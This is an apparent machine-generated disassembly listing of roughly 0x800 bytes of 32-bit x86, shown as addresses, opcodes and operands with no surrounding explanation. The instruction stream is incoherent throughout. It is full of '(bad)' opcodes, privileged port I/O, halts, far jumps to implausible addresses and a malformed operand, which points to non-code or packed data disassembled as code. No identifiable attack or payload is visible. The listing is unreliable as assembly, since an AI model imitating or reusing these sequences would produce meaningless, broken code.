  41d4f2:	mov    BYTE PTR [ebx],ah
  41d4f4:	test   DWORD PTR es:[edx+0x2c59685e],ecx
  41d4fb:	loopne 0x41d53f
  41d4fd:	cmp    al,BYTE PTR [edx+eiz*1-0x4b]
  41d501:	mov    esi,0xfd7c36dc
  41d506:	or     al,0xb6
  41d508:	stos   DWORD PTR es:[edi],eax
  41d509:	cmc    
  41d50a:	fcmovbe st,st(1)
  41d50c:	sbb    eax,0x455f2410
  41d511:	movzx  eax,BYTE PTR ds:0xe81ba681
  41d518:	dec    eax
  41d519:	jg     0x41d532
  41d51b:	js     0x41d49f
  41d51d:	pop    ebx
  41d51e:	out    0x7f,al
  41d520:	jae    0x41d4dd
  41d522:	and    dh,BYTE PTR [esi+eiz*2+0x8]
  41d526:	add    eax,0x741a6174
  41d52b:	push   cs
  41d52c:	jmp    0x41d590
  41d52e:	sub    eax,0x61
  41d531:	je     0x41d53a
  41d533:	jp     0x41d5b1
  41d535:	sub    bh,dl
  41d537:	pop    es
  41d538:	je     0x41d5a1
  41d53a:	jmp    0x41d592
  41d53c:	nop
  41d53d:	loopne 0x41d549
  41d53f:	mov    edx,0x5fdd64d4
  41d544:	addr16 push esi
  41d546:	cmc    
  41d547:	fwait
  41d548:	sbb    BYTE PTR fs:[esp+ebp*1],ch
  41d54c:	mov    edx,0x3032bdc
  41d551:	test   eax,0xba16213c
  41d556:	loopne 0x41d55c
  41d558:	(bad)  
  41d559:	fdivrp st(4),st
  41d55b:	shl    DWORD PTR [ebp+0x1d],cl
  41d55e:	clc    
  41d55f:	add    ebx,ebp
  41d561:	pop    ss
  41d562:	in     al,0xe0
  41d564:	xor    al,0x1
  41d566:	mov    BYTE PTR [eax],cl
  41d568:	push   DWORD PTR [edx]
  41d56a:	pop    es
  41d56b:	mov    al,ds:0xe9387493
  41d570:	dec    edx
  41d571:	push   0xb
  41d573:	lods   al,BYTE PTR ds:[esi]
  41d574:	stos   DWORD PTR es:[edi],eax
  41d575:	in     al,dx
  41d576:	mov    edi,DWORD PTR [ebp-0x16]
  41d579:	sar    BYTE PTR [edx],1
  41d57b:	je     0x41d592
  41d57d:	inc    ax
  41d57f:	push   es
  41d580:	lea    si,[esi+0xcbff89f]
  41d587:	add    bl,ch
  41d589:	or     cl,BYTE PTR [eax]
  41d58b:	jbe    0x41d591
  41d58d:	or     ch,bh
  41d58f:	or     al,0x3b
  41d591:	jle    0x41d59d
  41d593:	and    eax,DWORD PTR [ecx+0x19300780]
  41d599:	adc    ebp,DWORD PTR [ebp+0x34]
  41d59c:	lods   al,BYTE PTR ds:[esi]
  41d59d:	(bad)  
  41d59e:	(bad)  
  41d59f:	adc    DWORD PTR ds:0x44c45c5f,esp
  41d5a5:	pop    eax
  41d5a6:	adc    al,0x61
  41d5a8:	out    0x14,al
  41d5aa:	imul   eax,DWORD PTR [bx+si+0x7c8e],0x2f257240
  41d5b3:	push   ebx
  41d5b4:	cwde   
  41d5b5:	pushf  
  41d5b6:	dec    edx
  41d5b7:	es mov ecx,0x303cabc
  41d5bd:	in     al,0x0
  41d5bf:	ret    
  41d5c0:	loop   0x41d5ad
  41d5c2:	push   0xe95a48e6
  41d5c7:	retf   
  41d5c8:	mov    dl,BYTE PTR [esi-0x1e]
  41d5cb:	jne    0x41d5f6
  41d5cd:	jb     0x41d5b9
  41d5cf:	or     al,0xfe
  41d5d1:	and    DWORD PTR [ebx+ebx*8],0xffffffe2
  41d5d5:	pop    ebp
  41d5d6:	cmp    DWORD PTR [ecx-0x3bb3c0bf],esp
  41d5dc:	push   es
  41d5dd:	add    al,0x88
  41d5df:	lods   eax,DWORD PTR ds:[esi]
  41d5e0:	js     0x41d5f0
  41d5e2:	rcl    DWORD PTR [edi+0x4c927d3b],1
  41d5e8:	enter  0x2e5,0x1
  41d5ec:	add    bl,BYTE PTR [esi]
  41d5ee:	cld    
  41d5ef:	push   es
  41d5f0:	sub    BYTE PTR [ebp+0x11737d33],cl
  41d5f6:	fst    DWORD PTR [eax-0x77083793]
  41d5fc:	retf   
  41d5fd:	jmp    0x41d60e
  41d5ff:	and    DWORD PTR [eax+edx*4-0x36a2c9fd],edx
  41d606:	and    al,0xe8
  41d608:	xor    DWORD PTR [edi-0x655a266b],ebp
  41d60e:	xor    eax,0x3f08d94
  41d613:	gs xchg edx,eax
  41d615:	adc    esp,DWORD PTR [ecx]
  41d617:	cld    
  41d618:	data16 add bl,BYTE PTR [esi+0x7]
  41d61c:	jo     0x231d12b
  41d622:	mov    al,BYTE PTR [ecx-0x4b]
  41d625:	nop
  41d626:	push   eax
  41d627:	add    eax,0x9af34f1d
  41d62c:	shr    ecx,0x52
  41d62f:	adc    cl,BYTE PTR [eax+ebp*8]
  41d632:	or     esp,esi
  41d634:	sbb    edi,DWORD PTR [edx+eiz*4-0x762d13fd]
  41d63b:	mov    eax,0xef9d2ef4
  41d640:	push   ds
  41d641:	loopne 0x41d69b
  41d643:	jo     0x68625786
  41d649:	popf   
  41d64a:	mov    ecx,0x1f20b9ad
  41d64f:	imul   ecx,DWORD PTR [ebx-0x74],0x5be42757
  41d656:	je     0x41d6d3
  41d658:	inc    ebx
  41d659:	mov    ebx,gs
  41d65b:	gs leave 
  41d65d:	mov    BYTE PTR [eax+0x51],dh
  41d660:	fldpi  
  41d662:	pop    ds
  41d663:	or     al,0xc1
  41d665:	or     ebx,DWORD PTR [edi]
  41d667:	daa    
  41d668:	mov    bh,0xe4
  41d66a:	inc    esp
  41d66b:	adc    al,0xaa
  41d66e:	mov    esi,0x74dca1c5
  41d673:	or     DWORD PTR [ebx+0x20],ecx
  41d676:	ror    ecx,1
  41d678:	mov    edx,DWORD PTR [esi]
  41d67a:	sub    edx,DWORD PTR [ebp-0x24]
  41d67d:	push   0xffffffd8
  41d67f:	inc    bx
  41d681:	inc    ebx
  41d682:	push   ss
  41d683:	push   esp
  41d684:	jmp    0x41d698
  41d686:	sbb    DWORD PTR [edi+0x30],ecx
  41d689:	stos   DWORD PTR es:[edi],eax
  41d68a:	pop    esi
  41d68b:	cmp    DWORD PTR [eax],ebp
  41d68d:	(bad)  
  41d68f:	xchg   BYTE PTR [eax+0x385439e3],cl
  41d695:	xchg   ebp,eax
  41d696:	int    0x90
  41d698:	aam    0x2c
  41d69a:	lea    ebx,[ecx+eiz*8-0x1b]
  41d69e:	sahf   
  41d69f:	int3   
  41d6a0:	jmp    0x41d70d
  41d6a2:	not    ah
  41d6a4:	iret   
  41d6a5:	cmp    eax,DWORD PTR [ecx+0x4d]
  41d6a8:	das    
  41d6a9:	push   eax
  41d6aa:	dec    ebp
  41d6ab:	add    cl,BYTE PTR [esi+eax*1]
  41d6ae:	dec    ebp
  41d6af:	adc    eax,0xd9db0867
  41d6b4:	push   cs
  41d6b5:	add    BYTE PTR [edi],cl
  41d6b7:	sbb    bl,ah
  41d6b9:	xchg   esp,eax
  41d6ba:	repnz adc BYTE PTR [edi+0x380817f8],bh
  41d6c1:	jnp    0x41d64d
  41d6c3:	dec    eax
  41d6c4:	(bad)  
  41d6c5:	push   cs
  41d6c6:	sub    ebx,ecx
  41d6c8:	lahf   
  41d6c9:	mov    eax,ds:0xc3448a9d
  41d6ce:	ja     0x41d6bb
  41d6d0:	or     al,0x55
  41d6d2:	mov    eax,0x8e69150
  41d6d7:	ja     0x41d744
  41d6d9:	pushf  
  41d6da:	sbb    ecx,DWORD PTR [ebp-0x7439966b]
  41d6e0:	lea    esp,[ecx-0x6f]
  41d6e3:	jne    0x41d6a4
  41d6e5:	loope  0x41d6b8
  41d6e7:	stos   DWORD PTR es:[edi],eax
  41d6e8:	or     BYTE PTR [edi-0x91f48bd],bh
  41d6ee:	xchg   BYTE PTR [esi-0xb7f6a8f],bh
  41d6f4:	xor    eax,0x91710104
  41d6f9:	neg    DWORD PTR [edi]
  41d6fb:	adc    al,0xf8
  41d6fd:	outs   dx,DWORD PTR ds:[esi]
  41d6fe:	loope  0x41d6a9
  41d700:	(bad)  
  41d702:	fdivr  DWORD PTR [edi-0x71]
  41d705:	je     0x41d6f4
  41d707:	mov    DWORD PTR [edi],ebx
  41d709:	jecxz  0x41d70d
  41d70b:	xchg   BYTE PTR [edx-0x31],cl
  41d70e:	hlt    
  41d70f:	adc    DWORD PTR [eax-0x75d74bb],edi
  41d715:	jbe    0x41d70e
  41d717:	dec    ebp
  41d718:	(bad)  
  41d719:	pop    eax
  41d71a:	sbb    al,0xc0
  41d71c:	sub    esi,ebp
  41d71e:	dec    ecx
  41d71f:	sbb    BYTE PTR [ecx+0x1b8b4c64],al
  41d725:	xor    esi,esi
  41d727:	sbb    BYTE PTR [edx-0x40],0x26
  41d72b:	xchg   BYTE PTR [edx-0x57233ffd],cl
  41d731:	sub    eax,DWORD PTR [ecx+0x1f54188d]
  41d737:	fsubp  st(2),st
  41d739:	xor    BYTE PTR [esi+0x6f],ah
  41d73c:	psrld  mm7,QWORD PTR [edx-0x38470fe8]
  41d743:	adc    DWORD PTR [edx-0x2ffbcfbc],ecx
  41d749:	sub    al,0xa
  41d74b:	cld    
  41d74c:	xchg   edx,eax
  41d74d:	mov    dh,0xd2
  41d74f:	jae    0x41d758
  41d751:	jmp    0x41d7c5
  41d753:	int    0x72
  41d755:	sbb    BYTE PTR [esi+0x63],bh
  41d758:	sub    ecx,DWORD PTR [edx+0x20]
  41d75b:	idiv   BYTE PTR [ebx-0x45e03dd6]
  41d761:	mov    al,ds:0x288a656
  41d766:	(bad)  
  41d767:	sbb    BYTE PTR [edx-0x77],bl
  41d76a:	and    BYTE PTR [eax],0x1d
  41d76d:	mov    edx,0xf7ecde30
  41d772:	and    eax,0x4f954695
  41d777:	enter  0xb01b,0xc9
  41d77b:	or     DWORD PTR [edi-0x67],ecx
  41d77e:	xchg   edx,eax
  41d77f:	xor    ah,BYTE PTR [edi]
  41d781:	loope  0x41d763
  41d783:	sbb    bh,cl
  41d785:	(bad)  
  41d786:	nop
  41d787:	inc    ebx
  41d788:	test   BYTE PTR [ecx],ch
  41d78a:	push   ecx
  41d78b:	mov    WORD PTR ds:0xa5161a0b,es
  41d791:	pop    edx
  41d792:	adc    BYTE PTR [edi-0x74],cl
  41d795:	mov    WORD PTR [edx],gs
  41d797:	sub    ebx,DWORD PTR [eax-0x58]
  41d79a:	add    al,0xfc
  41d79c:	es jp  0x41d7e0
  41d79f:	add    DWORD PTR [esi],eax
  41d7a1:	mov    bl,0x1
  41d7a3:	and    eax,0x72792110
  41d7a8:	mov    al,ds:0x58a82c92
  41d7ad:	dec    ebx
  41d7ae:	or     BYTE PTR [edi+0x17],bl
  41d7b1:	push   ecx
  41d7b2:	mov    BYTE PTR [ecx],bh
  41d7b4:	lock out 0x30,al
  41d7b7:	or     al,0x77
  41d7b9:	sub    BYTE PTR [edi],bh
  41d7bb:	fcomp  QWORD PTR [ebx+0x682e1007]
  41d7c1:	sbb    BYTE PTR [edi+eax*1],0xe4
  41d7c5:	push   es
  41d7c6:	(bad)  
  41d7c7:	cmp    al,dl
  41d7c9:	pop    eax
  41d7ca:	rcl    BYTE PTR ds:0x7ff04e0,0x0
  41d7d1:	jp     0x41d7e3
  41d7d3:	outs   dx,DWORD PTR ds:[esi]
  41d7d4:	test   BYTE PTR [edi+0x62],bl
  41d7d7:	mov    edi,0x5b372913
  41d7dc:	(bad)  
  41d7dd:	fild   WORD PTR [esi+edi*1-0x1]
  41d7e1:	and    al,0xdf
  41d7e3:	sub    al,0x44
  41d7e5:	je     0x41d801
  41d7e7:	dec    al
  41d7e9:	je     0x41d7f5
  41d7eb:	sub    al,0xb6
  41d7ed:	sub    al,0xc
  41d7ef:	je     0x41d817
  41d7f1:	mov    dl,0xf7
  41d7f3:	inc    ebp
  41d7f4:	or     BYTE PTR [eax],dl
  41d7f6:	mov    bl,0x2
  41d7f8:	jmp    0x41d814
  41d7fa:	push   es
  41d7fb:	push   ss
  41d7fc:	push   eax
  41d7fd:	and    BYTE PTR [esi+0x2e],dh
  41d800:	loop   0x41d83f
  41d802:	in     al,dx
  41d803:	jmp    0x41d813
  41d805:	inc    edi
  41d806:	mov    cl,0xf8
  41d808:	jle    0x41d7d6
  41d80a:	fadd   st(3),st
  41d80c:	aas    
  41d80d:	jb     0x41d7ac
  41d80f:	xchg   esi,eax
  41d810:	(bad)  
  41d811:	pop    ebp
  41d812:	push   eax
  41d813:	add    edx,ebp
  41d815:	out    0xa7,eax
  41d817:	sti    
  41d818:	pusha  
  41d819:	add    DWORD PTR ds:0x464138b,ecx
  41d81f:	push   0x45c40389
  41d824:	div    BYTE PTR [eax+0x7c037f03]
  41d82a:	or     al,0x5b
  41d82c:	pop    ss
  41d82d:	xor    al,0x12
  41d82f:	jle    0x41d88d
  41d831:	(bad)  
  41d832:	push   ebp
  41d833:	push   ecx
  41d834:	mov    ebp,eax
  41d836:	sbb    edi,DWORD PTR [edi+0x47d7ee10]
  41d83c:	mov    ds:0xbed448bb,al
  41d841:	or     BYTE PTR fs:[esi],bh
  41d844:	jnp    0x41d80c
  41d846:	(bad)  
  41d847:	jbe    0x41d872
  41d849:	mov    eax,ebp
  41d84b:	(bad)  
  41d84d:	cvtps2pd xmm2,QWORD PTR [esp+edx*8+0x29]
  41d852:	mov    al,ds:0xfefc9ede
  41d857:	leave  
  41d858:	cmp    dl,BYTE PTR [edx]
  41d85a:	jle    0x41d865
  41d85c:	pushf  
  41d85d:	ret    
  41d85e:	add    al,0x4f
  41d860:	jne    0x41d834
  41d862:	sub    BYTE PTR [edi],dh
  41d864:	xor    eax,0xd32f5612
  41d869:	inc    DWORD PTR [eax+0x7f]
  41d86c:	cmp    DWORD PTR [di],0x4
  41d870:	adc    dh,BYTE PTR [ebp+0x3a]
  41d873:	cmp    ebx,0x63
  41d876:	jg     0x41d89c
  41d878:	popf   
  41d879:	fistp  WORD PTR [ebx+0x38]
  41d87c:	test   eax,0x995f643c
  41d881:	xor    eax,edx
  41d883:	sub    eax,edx
  41d885:	inc    ebx
  41d886:	scas   eax,DWORD PTR es:[edi]
  41d887:	sub    al,0xd4
  41d889:	add    ecx,eax
  41d88b:	add    ah,BYTE PTR [eax+eax*1+0x6b]
  41d88f:	shl    BYTE PTR [ebx+eax*1+0x6c],0xa7
  41d894:	jg     0x41d895
  41d896:	jle    0x41d81b
  41d898:	js     0x41d896
  41d89a:	add    BYTE PTR [esi+0xe],bh
  41d89d:	adc    bh,dh
  41d89f:	pop    eax
  41d8a0:	cld    
  41d8a1:	jmp    0x41d8a9
  41d8a3:	in     eax,0x48
  41d8a5:	cld    
  41d8a6:	gs jbe 0x41d870
  41d8a9:	jno    0x41d893
  41d8ab:	add    eax,ebx
  41d8ad:	(bad)  
  41d8af:	psubusb mm0,QWORD PTR [ebx+edi*4]
  41d8b3:	xor    DWORD PTR [edx-0x66],ebp
  41d8b6:	fsubr  st(0),st
  41d8b8:	in     al,0x52
  41d8ba:	xor    eax,DWORD PTR [edx+0x43c71a2a]
  41d8c0:	xchg   edi,eax
  41d8c1:	and    DWORD PTR [edi+eax*8],ebx
  41d8c4:	or     eax,esp
  41d8c6:	xor    BYTE PTR [edi-0x13f5ffd6],ch
  41d8cc:	test   al,0x5a
  41d8ce:	sbb    DWORD PTR [edi],0x9f911802
  41d8d4:	and    al,0x88
  41d8d7:	inc    ebp
  41d8d8:	idiv   BYTE PTR [edx-0x41]
  41d8db:	or     bl,BYTE PTR [ebx+eax*2+0x3ed18452]
  41d8e2:	xor    eax,0xae14a748
  41d8e7:	loopne 0x41d950
  41d8e9:	jne    0x41d91f
  41d8eb:	stc    
  41d8ec:	sub    DWORD PTR [ebx*8+0x7ef889ae],0xffffff8b
  41d8f4:	or     ecx,DWORD PTR [ecx-0x45]
  41d8f7:	mov    esp,DWORD PTR [ecx*4-0x24521bab]
  41d8fe:	cdq    
  41d8ff:	dec    esi
  41d900:	push   0x5c
  41d902:	jae    0xc3ec617c
  41d908:	in     eax,dx
  41d909:	stos   BYTE PTR es:[edi],al
  41d90a:	pop    eax
  41d90b:	adc    eax,0xfe5cb87d
  41d910:	sti    
  41d911:	call   0x565ec661
  41d916:	xor    BYTE PTR [eax],cl
  41d918:	mov    eax,ds:0xeb8c3a91
  41d91d:	mov    ebp,0xe6adf42a
  41d922:	hlt    
  41d923:	lods   eax,DWORD PTR ds:[esi]
  41d924:	or     DWORD PTR [eax+0x6e317e84],0xb00cfca9
  41d92e:	and    BYTE PTR [edx-0x7dd208f3],cl
  41d934:	test   al,0x1a
  41d936:	nop
  41d937:	add    edi,DWORD PTR [ecx-0x26]
  41d93a:	pop    esp
  41d93b:	jmp    0x272a:0x790302f2
  41d942:	into   
  41d943:	add    cl,ch
  41d945:	lock mov ds:0xd3834de3,eax
  41d94b:	bound  eax,QWORD PTR [esi+0x72012cf6]
  41d951:	mov    dl,0x22
  41d953:	sub    ch,BYTE PTR [eax+0x5d]
  41d956:	clc    
  41d957:	ret    0xeb3a
  41d95a:	push   edx
  41d95b:	lods   al,BYTE PTR ds:[esi]
  41d95c:	lock and al,0xe9
  41d95f:	in     al,dx
  41d960:	call   0x8583b66c
  41d965:	push   ss
  41d966:	hlt    
  41d967:	cmp    al,0xe
  41d969:	arpl   WORD PTR [ecx-0x1493e364],di
  41d96f:	ss aaa 
  41d971:	repnz hlt 
  41d973:	sbb    bl,BYTE PTR [eax-0x67]
  41d976:	nop
  41d977:	out    0xf4,al
  41d979:	jmp    0x41d96b
  41d97b:	cmp    DWORD PTR [ebp-0x40],0xe
  41d97f:	cs mov ah,0x5d
  41d982:	push   ebp
  41d983:	dec    BYTE PTR ds:0x508159c8
  41d989:	cld    
  41d98a:	aad    0xf2
  41d98c:	jo     0x41d90e
  41d98e:	jge    0x41d978
  41d990:	add    dh,BYTE PTR [edi+0x6a]
  41d993:	fist   WORD PTR [edi+edx*1]
  41d996:	dec    ebp
  41d997:	add    esp,edx
  41d999:	shr    BYTE PTR [ebx],1
  41d99b:	(bad)  
  41d99c:	push   ecx
  41d99d:	fst    DWORD PTR ds:0x5938b5cb
  41d9a3:	data16 fmul QWORD PTR [edx-0x1e]
  41d9a7:	cmp    eax,0xdbfdbdec
  41d9ac:	aaa    
  41d9ad:	add    BYTE PTR [esi+0x50],dh
  41d9b0:	(bad)  
  41d9b1:	cmp    ecx,eax
  41d9b3:	jle    0x41d9ea
  41d9b5:	and    bh,al
  41d9b7:	fs jmp 0x41d9e9
  41d9ba:	jne    0x41d94e
  41d9bc:	popa   
  41d9bd:	or     ebx,DWORD PTR [eax+ebx*8]
  41d9c0:	mov    ?,esi
  41d9c2:	add    eax,ecx
  41d9c4:	or     esi,ebx
  41d9c6:	lds    edx,FWORD PTR [eax]
  41d9c8:	or     cl,BYTE PTR [esi+edi*1+0x77]
  41d9cc:	daa    
  41d9cd:	xor    al,0x3
  41d9cf:	sbb    BYTE PTR [esi+0x67506409],al
  41d9d5:	xchg   ecx,eax
  41d9d6:	sub    ecx,DWORD PTR [edi+ecx*1-0x37]
  41d9da:	mov    bl,0x37
  41d9dc:	push   0xd2798436
  41d9e1:	xor    esp,ecx
  41d9e3:	jle    0x41d980
  41d9e5:	imul   ecx,DWORD PTR [edx+0x146af400],0xffffff9f
  41d9ec:	and    edx,DWORD PTR [edx]
  41d9ee:	jmp    0xb15061d9
  41d9f3:	fwait
  41d9f4:	int    0xc4
  41d9f6:	jne    0x41da01
  41d9f8:	cmp    BYTE PTR [eax+eiz*1+0x75],0xea
  41d9fd:	shr    DWORD PTR [ebp+0x39b4c542],0x54
  41da04:	add    ah,bl
  41da06:	jmp    FWORD PTR [ebp-0x41]
  41da09:	scas   al,BYTE PTR es:[edi]
  41da0a:	jb     0x41d9e7
  41da0c:	add    ebx,ecx
  41da0e:	fsubr  QWORD PTR [edi]
  41da10:	add    esp,DWORD PTR [ecx+ebp*2+0x2a74df7f]
  41da17:	push   edx
  41da18:	fcom   DWORD PTR [ebx+eax*4-0x2749fed0]
  41da1f:	das    
  41da20:	xor    eax,DWORD PTR [edx+eiz*1-0x563f0ff1]
  41da27:	xchg   esp,eax
  41da28:	repnz push ebp
  41da2a:	out    dx,al
  41da2b:	dec    ebx
  41da2c:	jb     0x41d9cd
  41da2e:	ret    
  41da2f:	or     DWORD PTR [edx-0x608fd2c],0xbad8974a
  41da39:	bound  ebx,QWORD PTR [eax]
  41da3b:	mov    al,0x90
  41da3d:	add    al,0x71
  41da3f:	ret    
  41da40:	pop    ss
  41da41:	adc    dh,ah
  41da43:	and    bl,bh
  41da45:	outs   dx,DWORD PTR gs:[esi]
  41da47:	add    BYTE PTR fs:[ecx],ah
  41da4a:	xchg   esi,eax
  41da4b:	pusha  
  41da4c:	add    bh,dl
  41da4e:	push   es
  41da4f:	fcom   QWORD PTR [eax]
  41da51:	ret    0x3584
  41da54:	or     edi,0xffffffff
  41da57:	push   0x66
  41da59:	loope  0x41da86
  41da5b:	or     DWORD PTR ds:0x1c82dd4f,0x4c
  41da62:	sbb    ebp,DWORD PTR [eax+0x2412b7b4]
  41da68:	mov    ecx,0x23409950
  41da6d:	es (bad) 
  41da6f:	jmp    0x41da7f
  41da71:	in     al,0x48
  41da73:	mov    edx,0x5c94512a
  41da78:	add    eax,0x31361da0
  41da7d:	pop    esi
  41da7e:	add    BYTE PTR [ebp-0x3aa59701],al
  41da84:	adc    BYTE PTR [edx],bl
  41da86:	and    al,0x5c
  41da88:	pop    ss
  41da89:	inc    eax
  41da8a:	push   eax
  41da8b:	push   esi
  41da8c:	pop    ds
  41da8d:	ins    DWORD PTR es:[edi],dx
  41da8e:	inc    esi
  41da8f:	mul    DWORD PTR [ebx]
  41da91:	inc    edi
  41da92:	inc    ebp
  41da93:	add    DWORD PTR [ecx],edi
  41da95:	aaa    
  41da96:	xor    esi,DWORD PTR [edx]
  41da98:	imul   esi,DWORD PTR [esi+eax*1],0xd
  41da9c:	or     BYTE PTR [edx],cl
  41da9e:	retf   0xd8a
  41daa1:	mov    WORD PTR [eax],fs
  41daa3:	ret    
  41daa4:	fisub  WORD PTR [ecx]
  41daa6:	test   al,0xa6
  41daa8:	je     0x41da2d
  41daaa:	or     dh,BYTE PTR [edx]
  41daac:	enter  0x7b00,0x3
  41dab0:	add    DWORD PTR [ecx+0x47],ebx
  41dab3:	or     al,0x39
  41dab5:	nop
  41dab6:	xchg   ecx,eax
  41dab7:	pop    es
  41dab8:	(bad)  
  41dab9:	add    BYTE PTR [edi+0x1a],bh
  41dabc:	jmp    0x85a9:0xe0640e0
  41dac3:	ret    0x6203
  41dac6:	xor    BYTE PTR [eax+0x33],dh
  41dac9:	and    al,0x66
  41dacb:	sbb    al,0xf9
  41dacd:	fist   DWORD PTR [ecx]
  41dacf:	inc    ebx
  41dad0:	je     0x41db18
  41dad2:	(bad)  
  41dad4:	ja     0x41db14
  41dad6:	jne    0x41dadf
  41dad8:	xor    DWORD PTR [esi+0x40f3a7b],eax
  41dade:	add    DWORD PTR [ebx+edi*2],ebx
  41dae1:	push   ds
  41dae2:	pop    edi
  41dae3:	(bad)  
  41dae4:	rol    DWORD PTR [edx+ebp*1],0xe0
  41dae8:	add    al,0x22
  41daea:	stos   DWORD PTR es:[edi],eax
  41daeb:	adc    edi,DWORD PTR [ecx+ecx*1]
  41daee:	push   eax
  41daef:	add    al,0x54
  41daf1:	pop    edx
  41daf2:	sub    DWORD PTR [ebp*1+0x1e7c0561],ecx
  41daf9:	int3   
  41dafa:	mov    fs,esi
  41dafc:	ret    0xda5d
  41daff:	or     DWORD PTR [edi-0x77e825bf],eax
  41db05:	pushf  
  41db06:	les    ebx,FWORD PTR [ecx]
  41db08:	push   eax
  41db09:	xlat   BYTE PTR ds:[ebx]
  41db0a:	pushf  
  41db0b:	les    eax,FWORD PTR [ebx]
  41db0d:	test   al,0xa2
  41db0f:	xchg   ebx,eax
  41db10:	into   
  41db11:	jmp    0xe116225c
  41db16:	xchg   DWORD PTR [eax+0x2a],ebp
  41db19:	out    dx,eax
  41db1a:	xchg   edx,eax
  41db1b:	adc    DWORD PTR [esi+0x7c38d082],esp
  41db21:	lods   eax,DWORD PTR ds:[esi]
  41db22:	pop    edx
  41db23:	pop    edi
  41db24:	shl    dh,0x8
  41db27:	sub    eax,0xb3cce8ac
  41db2c:	add    DWORD PTR [ecx+0x5d],esi
  41db2f:	cmp    al,0x92
  41db31:	pusha  
  41db32:	pop    esi
  41db33:	in     eax,dx
  41db34:	adc    al,0x99
  41db36:	aaa    
  41db37:	jnp    0x41db08
  41db39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db3a:	mov    dh,al
  41db3c:	test   BYTE PTR [ebx*1+0x381e8915],ah
  41db43:	cmp    BYTE PTR [ebx],dl
  41db45:	jbe    0x41dada
  41db47:	adc    bl,al
  41db49:	jne    0x41db58
  41db4b:	dec    ebx
  41db4c:	mov    DWORD PTR [esp+0x7e],ebx
  41db50:	mov    cl,0xc0
  41db52:	jb     0x41db7b
  41db54:	fst    st(4)
  41db56:	fcomp  DWORD PTR ds:0xfdf29a1c
  41db5c:	jmp    0x41db14
  41db5e:	fbstp  TBYTE PTR [edx+0xd]
  41db61:	sbb    eax,0x1fddaadc
  41db66:	fwait
  41db67:	jmp    0x41db74
  41db69:	sbb    DWORD PTR [ebx+eax*4+0x2b],esp
  41db6d:	mov    ds:0x7d18a9c1,al
  41db72:	jle    0x41db6a
  41db74:	push   edx
  41db75:	aaa    
  41db76:	les    eax,FWORD PTR [ecx+0x6adaddc4]
  41db7c:	add    BYTE PTR [edi+0x54],cl
  41db7f:	dec    esi
  41db80:	clc    
  41db81:	rol    dl,cl
  41db83:	mov    al,0x52
  41db85:	push   ss
  41db86:	xchg   ebx,eax
  41db87:	xor    dh,BYTE PTR [eax]
  41db89:	jmp    0x41db8c
  41db8b:	loopne 0x41db83
  41db8d:	dec    DWORD PTR [ecx]
  41db8f:	sbb    BYTE PTR [esi],cl
  41db91:	mov    dl,BYTE PTR [esp+eax*1-0x1]
  41db95:	sub    dl,0x21
  41db98:	jb     0x41db8c
  41db9a:	or     BYTE PTR ds:0x2e4bed74,cl
  41dba0:	adc    esi,ecx
  41dba2:	or     al,0xcb
  41dba4:	xchg   ecx,eax
  41dba5:	sti    
  41dba6:	jno    0x41db5e
  41dba8:	and    eax,0x9b075d91
  41dbad:	icebp  
  41dbae:	pop    ebp
  41dbaf:	or     BYTE PTR [ecx+0x7002a1de],ah
  41dbb5:	lea    eax,[eax]
  41dbb7:	pop    ss
  41dbb8:	dec    edx
  41dbb9:	js     0x41db49
  41dbbb:	adc    dl,BYTE PTR [edx]
  41dbbd:	enter  0xa508,0x82
  41dbc1:	(bad)  
  41dbc2:	das    
  41dbc3:	add    ecx,DWORD PTR [edx]
  41dbc5:	jmp    0x41dc24
  41dbc7:	(bad)  
  41dbc8:	dec    ebp
  41dbc9:	and    esi,DWORD PTR [ecx]
  41dbcb:	es loopne 0x41dbfa
  41dbce:	cld    
  41dbcf:	pop    ds
  41dbd0:	jg     0x41dbde
  41dbd2:	xor    esp,ebp
  41dbd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbd5:	fprem  
  41dbd7:	push   0x2
  41dbd9:	push   ds
  41dbda:	add    DWORD PTR ds:0x604182a4,0x1df9960c
  41dbe4:	(bad)  
  41dbe5:	dec    edx
  41dbe6:	sub    DWORD PTR [edi+0x8b79e82],eax
  41dbec:	push   ebp
  41dbed:	(bad)  
  41dbee:	call   0x33edece7
  41dbf3:	leave  
  41dbf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbf5:	adc    al,0x70
  41dbf7:	xor    cl,ah
  41dbf9:	mov    ch,BYTE PTR [eax-0x26]
  41dbfc:	dec    esp
  41dbfd:	adc    al,0x20
  41dbff:	xor    BYTE PTR [eax+0x68],0x16
  41dc03:	data16 mov al,0x52
  41dc06:	xor    BYTE PTR [edi+0x6b],cl
  41dc09:	pop    edi
  41dc0a:	dec    esp
  41dc0b:	call   0x8401:0x51bdc23c
  41dc12:	(bad)  
  41dc13:	das    
  41dc14:	pushf  
  41dc15:	push   ds
  41dc16:	xchg   BYTE PTR [ebx],al
  41dc18:	(bad)  
  41dc19:	xor    eax,eax
  41dc1b:	mov    ebp,0xd2077e22
  41dc20:	mov    esi,0x8d042a0
  41dc25:	push   ebp
  41dc26:	push   0xb
  41dc28:	aaa    
  41dc29:	or     ch,BYTE PTR [esi]
  41dc2b:	cld    
  41dc2c:	mov    bh,BYTE PTR [ecx-0x7261df84]
  41dc32:	inc    ebx
  41dc33:	inc    esp
  41dc34:	xchg   edi,eax
  41dc35:	add    BYTE PTR [ecx-0x45],0x48
  41dc39:	retf   
  41dc3a:	fcomp  QWORD PTR [ecx-0x42]
  41dc3d:	pop    es
  41dc3e:	inc    ebx
  41dc3f:	push   es
  41dc40:	imul   edi,DWORD PTR [esi-0x530fba04],0xc0098238
  41dc4a:	in     eax,0xf0
  41dc4c:	mov    eax,edi
  41dc4e:	inc    ebx
  41dc4f:	push   edx
  41dc50:	fidivr DWORD PTR ds:0xfbc0bf67
  41dc56:	or     eax,0xc1ae75
  41dc5b:	addr16 sbb al,0x8
  41dc5e:	pop    esp
  41dc5f:	add    eax,0x22c05cd
  41dc64:	pop    es
  41dc65:	push   cs
  41dc66:	xchg   esi,eax
  41dc67:	push   es
  41dc68:	add    DWORD PTR [ecx],esp
  41dc6a:	shl    BYTE PTR [esp+ebp*8],cl
  41dc6d:	fsubr  st(6),st
  41dc6f:	fwait
  41dc70:	or     al,0xfb
  41dc72:	mov    es,eax
  41dc74:	xor    ecx,esp
  41dc76:	in     al,dx
  41dc77:	dec    ecx
  41dc78:	call   0x932e0ec0
  41dc7d:	clc    
  41dc7e:	sub    ah,ch
  41dc80:	call   0x240c588d
